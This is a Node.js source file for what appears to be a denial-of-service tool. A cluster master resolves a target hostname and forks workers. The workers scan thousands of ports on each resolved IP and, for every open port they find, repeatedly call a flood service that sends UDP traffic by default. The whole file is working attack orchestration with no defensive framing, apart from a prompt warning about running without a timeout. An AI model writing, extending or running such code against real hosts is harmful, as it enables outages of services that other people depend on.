const cluster = require('cluster');
const Confirm = require('prompt-confirm');
const portScanner = require('portscanner');
const isopen = require("isopen");
const findStartAndEndPorts = require('./services/WorkersService');
const flood = require('./services/FloodService');
const program = require('commander');
const programHelp = require('./services/ProgramHelpService')(program);

const resolveHostname = require('./services/DnsResolver');
const http = require('http');
const numCPUs = require('os').cpus().length;
const cpuFactor = (numCPUs / 4);//Use 1 in production

const options = {
    target: '127.0.0.1',
    port: '21-23',
    status: 'TROU',
    banner: true
};
const question = new Confirm('CAUTION: You are running flood without any timeout to stop, you can define a timeout with --timeout. Continue? [Y/N] ');
const host = program.host || 'localhost';
const type = program.type || 'UDP';
const port = program.port || 3000;
const timeout = program.timeout || 10000;
if (host) {
    if (cluster.isMaster) {
        let resolvedIpsEnvVar = {};
        console.log("Master " + process.pid + " is running");
        resolveHostname(host)
            .then((ips) => {
                resolvedIpsEnvVar["IPS"] = ips.map((ip) => {
                    return ip.address
                }).toString();
                console.log("Found ips for " + host + ": " + JSON.stringify(ips));
                for (let i = 0; i < cpuFactor; i++) { //TODO change me to use all cores
                    resolvedIpsEnvVar["WORKER_ID"] = i + 1;
                    cluster.fork(resolvedIpsEnvVar);
                }
                cluster.on('exit', function (worker, code, signal) {
                    console.log("EXITING: worker " + worker.process.pid + " died code:" + code + " signal: " + signal);
                });
            }).catch(function (error) {
            throw error;

        });
    } else {
        // Worker 3700 started
        // *** Worker 3700 starting on 127.0.0.1 using range: (0, 8191) ***
        // Worker 20664 started
        // *** Worker 20664 starting on 127.0.0.1 using range: (8191, 16382) ***
        console.log("Worker " + process.pid + " started");
        let ports = [];
        const ips = process.env['IPS'].split(',');
        const workerId = process.env['WORKER_ID'];
        let startTime = new Date();
        // while(1){
        //     if (timeout) {
        //         let nowTime = new Date();
        //         if (nowTime.getTime() >= (startTime.getTime() + timeout)) {
        //             console.log('Timeout Reached for pid: ' + process.pid);
        //             break;
        //         }
        //     }
        for (let i = 0; i < ips.length; i++) {
            const ip = ips[i];
            let [start, end] = findStartAndEndPorts(workerId, numCPUs);
            console.log(`*** Worker ${process.pid} starting on ${ip} using range: (${start}, ${end}) ***`);
            const N = 8000;
            const portRange = Array.apply(null, {length: N}).map(function (value, index) {
                return index + start;
            });
            // console.log('*** Worker ' + process.pid + ' current range:' + portRange[0] + ',' + portRange[portRange.length -1]);
            for (let i = 0; i < portRange.length; i = i + 1000) {
                const M = 1000;
                const currentRange = Array.apply(null, {length: M}).map(function (value, index) {
                    return index + portRange[i];
                });
                // console.log('*** Worker ' + process.pid + ' current range:' + currentRange[0] + ',' + currentRange[currentRange.length -1]);
                portScanner.findAPortInUse(currentRange, ip, function (error, port) {
                    if (error) {
                        console.log(error);
                    }
                    if (port) {
                        console.log('*** Worker ' + process.pid + ' found open port:' + port);
                        for (let i = 0; i <= 10; i++) {//TODO This number may vary
                            flood(type, ip, port, port, timeout)
                            //     .then(function (results) {
                            //     const [pid, bytes, HOST, port, socketAddress, socketPort] = results;
                            //     console.log('pid: ' + pid + ' sent package UDP with ' + bytes + ' bytes message to ' + HOST + ':' + port + ' from ' + socketAddress + ':' + socketPort);
                            // });
                            // console.log('I am flooding');
                        }
                    }
                    // else {
                    //     console.log(`Worker ${process.pid} at ${ip} did not found open ports at port: ${scannedPort}`)
                    // }
                });
            }
        }
    }
    // }
} else {
    programHelp.help();
}